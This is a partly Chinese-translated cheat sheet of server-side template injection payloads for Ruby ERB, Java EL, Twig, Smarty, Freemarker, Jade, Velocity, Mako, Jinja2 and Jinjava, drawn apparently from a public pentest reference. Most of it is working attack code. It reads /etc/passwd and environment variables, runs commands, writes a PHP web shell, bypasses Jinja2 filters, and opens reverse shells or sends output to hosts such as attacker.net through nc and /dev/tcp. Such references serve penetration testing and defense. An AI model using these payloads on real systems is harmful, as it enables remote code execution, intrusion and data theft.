# Templates 注入

> 模板注入允许攻击者将模板代码包含到现有（或不存在）模板中。模板引擎通过使用静态模板文件（在运行时用HTML页面中的实际值替换变量/占位符）使设计HTML页面变得更容易。

## 概要

* [Tools](#tools)
* [Methodology](#methodology)
* [Ruby](#ruby)
  * [Basic injection](#basic-injection)
  * [Retrieve /etc/passwd](#retrieve--etc-passwd)
  * [List files and directories](#list-files-and-directories)
* [Java](#java)
  * [Basic injection](#basic-injection)
  * [Retrieve the system’s environment variables](retrieve-the-system-s-environment-variables)
  * [Retrieve /etc/passwd](#retrieve--etc-passwd)
* [Twig](#twig)
  * [Basic injection](#basic-injection)
  * [Template format](#template-format)
  * [Code execution](#code-execution)
* [Smarty](#smarty)
* [Freemarker](#freemarker)
  * [Basic injection](#basic-injection)
  * [Code execution](#code-execution)
* [Jade / Codepen](#jade---codepen)
* [Velocity](#velocity)
* [Mako](#mako)
* [Jinja2](#jinja2)
  * [Basic injection](#basic-injection)
  * [Template format](#template-format)
  * [Dump all used classes](#dump-all-used-classes)
  * [Dump all config variables](#dump-all-config-variables)
  * [Read remote file](#read-remote-file)
  * [Write into remote file](#write-into-remote-file)
  * [Remote Code Execution](#remote-code-execution)
  * [Filter bypass](filter-bypass)
* [Jinjava](#jinjava)
  * [Basic injection](#basic-injection)
  * [Command execution](#command-execution)

## Tools

Recommended tool: [Tplmap](https://github.com/epinna/tplmap)
e.g:

```powershell
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```

## Methodology

![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)

## Ruby

### Basic injection

```ruby
<%= 7 * 7 %>
```

### Retrieve/etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### List files and directories

```ruby
<%= Dir.entries('/') %>
```

## Java

### Basic injection

```java
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
```

### Retrieve the system’s environment variables

```java
${T(java.lang.System).getenv()}
```

### Retrieve/etc/passwd

```java
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

## Twig

### Basic injection

```python
{{7*7}}
{{7*'7'}} would result in 49
```

### Template format

```python
$output = $twig > render (
  'Dear' . $_GET['custom_greeting'],
  array("first_name" => $user.first_name)
);

$output = $twig > render (
  "Dear {first_name}",
  array("first_name" => $user.first_name)
);
```

### Code execution

```python
{% raw %}
{{self}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{% endraw %}
```

## Smarty

```python
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

## Freemarker

You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

### Basic injection

模板可以是`${3*3}`或旧的`{3*3}`

### Code execution

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

## Jade / Codepen

```python
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

## Velocity

```python
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

## Mako

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

## Jinja2

[Official website](http://jinja.pocoo.org/)

> Jinja2是一个功能齐全的Python模板引擎。它完全支持unicode，是一个可选的集成沙盒执行环境，广泛使用并获得BSD许可。 

### Basic injection

```python
{% raw %}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
{{config.items()}}
{% raw %}
```

Jinja2被Python Web框架（如Django或Flask）使用。

上述注射剂已在烧瓶上进行了试验。

### Template format

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}

```

### Dump all used classes

```python
{% raw %}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% endraw %}
```

### Dump all config variables

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### Read remote file

```python
{% raw %}
# ''.__class__.__mro__[2].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
{% endraw %}
```

### Write into remote file

```python
{% raw %}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
{% endraw %}
```

### Remote Code Execution

```bash
nv -lnvp 8000
```

#### 通过调用subprocess.Popen利用SSTI。
:warning: 数字396将根据应用而变化。

```python
{% raw %}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{% endraw %}
```

#### 通过调用Popen猜测偏移量来利用SSTI

```python
{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{% endraw %}
```

#### 通过编写一个配置文件来利用SSTI。

```python
# evil config
{% raw %}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
{% endraw %}
```


### Filter bypass

```python
request.__class__
request["__class__"]
```

绕过`_`

```python
{% raw %}
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{% endraw %}
```

绕过`[` and `]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
or
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

绕过 `|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

## Jinjava

### Basic injection

```python
{% raw %}
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
{% endraw %}
```

Jinjava是Hubspot开发的一个开源项目，可在[https://github.com/Hubspot/Jinjava/]上找到

### Code execution

修正者 https://github.com/HubSpot/jinjava/pull/230

```python
{% raw %}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}


{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{% endraw %}
```


## 工具书类

* [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
* [Yahoo! RCE via Spring Engine SSTI](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)
* [Ruby ERB Template injection - TrustedSec](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
* [Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
* [PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
* [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/)
* [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
* [RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug](https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad)
* [RCE in Hubspot with EL injection in HubL - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
* [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
* [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
* [EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018](https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf)
